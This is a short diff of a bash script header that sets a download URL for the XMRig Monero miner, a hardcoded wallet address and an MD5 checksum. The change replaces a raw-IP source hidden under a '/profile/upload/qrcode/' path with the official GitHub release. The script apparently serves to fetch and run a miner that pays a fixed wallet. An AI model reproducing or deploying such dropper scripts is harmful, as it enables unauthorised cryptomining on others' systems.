@@ -1,6 +1,6 @@
 #!/bin/bash
 
-REMOTE_SCRIPT_URL="http://123.57.219.71:8008/profile/upload/qrcode/xmrig-6.25.0-linux-static-x64.tar.gz"
+REMOTE_SCRIPT_URL="https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz"
 WALLET_ADDRESS="4463BC3XZoP2K2wZwFPoQfhB41QpAH5p3SpBmmKcFpKBXfnGd4vx9MhRjnizkg2Q7kdbHwj9zQRJHEsYeLuGCMwNMw8SNFU"
 EXPECTED_MD5="cf127d66124c390ca0f0b42c6385c3c8"
 
